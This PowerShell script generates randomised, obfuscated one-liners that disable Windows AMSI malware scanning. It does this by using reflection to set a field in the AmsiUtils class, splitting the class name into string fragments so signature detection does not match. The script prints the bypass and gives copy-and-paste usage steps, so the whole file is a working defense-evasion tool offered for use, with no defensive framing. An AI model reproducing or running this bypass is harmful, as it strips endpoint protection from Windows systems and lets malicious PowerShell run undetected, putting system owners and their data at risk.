param(
    [switch]$Plaintext,
    [switch]$Help
)

$ErrorActionPreference = 'SilentlyContinue'

function Show-Help {
    Write-Host "PowerShell ASMI Bypass" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "USAGE:"
    Write-Host "  .\PSHelper.ps1"
    Write-Host ""
    Write-Host "SUPPORTED PLATFORMS:"
    Write-Host "  - Windows Server 2016/2019/2022"
    Write-Host "  - Windows 10/11"
}

function Get-RandomTrue {
    return (Get-Random -InputObject @('[bool]1', '1 -eq 1', '!(0)'))
}

function Get-TypePattern {
    $patterns = @(
        '$a=[Ref].Assembly;$at=$a.GetType({TYPE})',
        '$asm=[Ref].Assembly;$at=$asm.GetType({TYPE})',
        '$r=[Ref].Assembly;$at=$r.GetType({TYPE})'
    )
    return (Get-Random -InputObject $patterns)
}

function Get-TypeObfuscation {
    $patterns = @(
        "('Sys'+'tem.Man'+'agement.Aut'+'omation.AmsiUtils')",
        "('Sy'+'stem.'+'Management.A'+'utomation.'+'AmsiUtils')",
        "('System.'+'Management.'+'Automation.'+'AmsiUtils')"
    )
    return (Get-Random -InputObject $patterns)
}

function Get-ValuePattern {
    $patterns = @(
        '$fld.SetValue($null,{TRUE})',
        'if(-not$fld.GetValue($null)){$fld.SetValue($null,{TRUE})}',
        '$fld.SetValue($null,{TRUE});$fld.GetValue($null)|Out-Null'
    )
    return (Get-Random -InputObject $patterns)
}

function Generate-Bypass {
    $bypass = '$ErrorActionPreference=''SilentlyContinue'';'
    
    # Type resolution
    $typePattern = Get-TypePattern
    $typeObf = Get-TypeObfuscation
    $bypass += $typePattern.Replace('{TYPE}', $typeObf) + ';'
    
    # GetFields
    $bypass += '$fields=$at.GetFields(60);'
    $bypass += '$fields.Count|Out-Null;'
    
    # Field access
    $bypass += '$fld=$fields[2];'
    $bypass += '$fld.Name|Out-Null;'
    
    # SetValue
    $valuePattern = Get-ValuePattern
    $trueVal = Get-RandomTrue
    $bypass += $valuePattern.Replace('{TRUE}', $trueVal)
    
    return $bypass
}

if ($Help) {
    Show-Help
    exit
}

Write-Host "========================================================================================================" -ForegroundColor Cyan
Write-Host "              AMSI String                      " -ForegroundColor Cyan
Write-Host "========================================================================================================" -ForegroundColor Cyan
Write-Host ""

$bypass = Generate-Bypass


Write-Host "[*] PLAINTEXT OUTPUT:" -ForegroundColor Green
Write-Host ""
Write-Host $bypass
Write-Host ""


Write-Host "USAGE:" -ForegroundColor Yellow
Write-Host "  1. Copy output above"
Write-Host "  2. Paste into PowerShell"
Write-Host ""
Write-Host "TESTING:" -ForegroundColor Cyan
Write-Host "  'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'"
Write-Host ""
